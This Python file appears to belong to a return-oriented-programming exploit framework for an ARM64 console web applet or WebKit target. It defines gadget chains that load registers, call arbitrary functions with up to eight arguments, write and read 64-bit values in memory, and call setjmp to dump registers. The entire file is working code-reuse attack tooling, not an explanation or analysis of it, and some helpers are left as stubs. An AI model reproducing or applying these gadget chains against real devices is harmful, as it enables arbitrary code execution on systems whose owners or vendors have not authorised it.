from targets.base_100_webapplet import Gadgets100Webapplet, Functions100Webapplet, Dataptrs100Webapplet
from targets.base_100_wk import Gadgets100Wk, Functions100Wk

from targets.base_rop import BaseRop

from util import u64, isint
from relocatable import data_base, Relocatable

import struct


class Gadgets(Gadgets100Wk, Gadgets100Webapplet):
    pass


class Functions(Functions100Wk, Functions100Webapplet):
    pass


class Dataptrs(Dataptrs100Webapplet):
    pass


class Rop(BaseRop):

    G = Gadgets()
    F = Functions()
    D = Dataptrs()

    # Utility functions, these do not modify the chain

    def _load_x8_x0_x1(self, x8, x0=0, x1=0):
        return [
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0,
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30, # x22
            x8, x0, x1, # x21, x20, x19
            0, # x29

            self.G.mov_x8_x21_mov_x0_x20_mov_x1_x19_blr_x22,

            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        ]

    # Ropgen functions, these do modify the chain

    def call_v8(self, func, a0=0, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0, a7=0, x8=None):
        self.rop += self._load_x8_x0_x1(self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30)
        self.rop += [
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0,
            a0, # x23
            a2, # x22
            a3, # x21
            a4, # x20
            a1, # x19
            0,

            self.G.mov_x0_x23_mov_x1_x19_mov_x2_x22_mov_x3_x21_mov_x4_x20_blr_x8,

            0, 0, 0, 0, 0, 0, 0,
            a5, # x21
            a6, # x20
            a7, # x19
            0,

            self.G.mov_x5_x21_mov_x6_x20_mov_x7_x19_trash_stack_blr_x8,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        ]

        if x8 is not None:
            self.rop += self._load_x8_x0_x1(x8, a0, a1)

        self.rop += [
            # load writeable mem into x19
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0, 0, 0,
            func, # x20
            self.scratch - 0x400, # x19
            0,

            self.G.blr_x20_trash_mem_pop_x20_x19_x29_x30,
            0, 0, 0,
        ]


    def call_rv4(self, func, a0, a1=0, a2=0, a3=0, a4=0):
        self.store_ret(self.scratch)
        self.rop += self._load_x8_x0_x1(self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30)
        self.load_ret(self.scratch)
        self.rop += [
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0,
            0, # x23
            a2, # x22
            a3, # x21
            a4, # x20
            a1, # x19
            0,

            self.G.mov_x1_x19_mov_x2_x22_mov_x3_x21_mov_x4_x20_blr_x8,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

            # load writeable mem into x19
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0, 0, 0,
            func, # x20
            self.scratch - 0x400, # x19
            0,

            self.G.blr_x20_trash_mem_pop_x20_x19_x29_x30,
            0, 0, 0,
        ]

    # v: constant, r: retval, l: load
    _call_funcs = {
        "vvvvvvvv": call_v8,
        "rvvvv": call_rv4,
    }

    def write64(self, val, dst):
        self.rop += [
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0, 0, 0,
            dst,
            val,
            0,

            self.G.str_x19_x20_pop_x20_x19_x29_x30,
            0, 0, 0,
        ]

    def store_ret(self, addr):
        """ Store x0 to addr """
        self.rop += [
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0, 0, 0, 0,
            addr,
            0,

            self.G.str_x0_x19_pop_x19_0_x29_x30,
            0, 0, 0,
        ]

    def load_ret(self, addr):
        """ Load x0 from addr """
        self.rop += [
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0, 0, 0,
            addr,
            0, 0,

            self.G.ldr_x0_x20_pop_x20_x19_x29_x30,
            0, 0, 0,
        ]

    def infloop(self):
        self.rop += [
            # todo
        ]

    def jmp(self, new_stack):
        raise NotImplementedError

    def dump_regs(self, ptr, and_store_r0=None):
        if and_store_r0 is not None:
            self.store_ret(and_store_r0)

        buf = ptr # where we place jmp_buf
        pbuf = ptr # need this to load to x0 in a weird way
        self.write64(buf, pbuf)
        self.load_ret(pbuf) # load buf to x0
        # ok now call setjmp but we can't use generic caller since it'd corrupt regs
        self.rop += [
            self.G.pop_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0, 0, 0,
            self.F.setjmp, # x20
            self.scratch - 0x400, # x19
            0,

            self.G.blr_x20_trash_mem_pop_x20_x19_x29_x30,
            0, 0, 0,
        ]
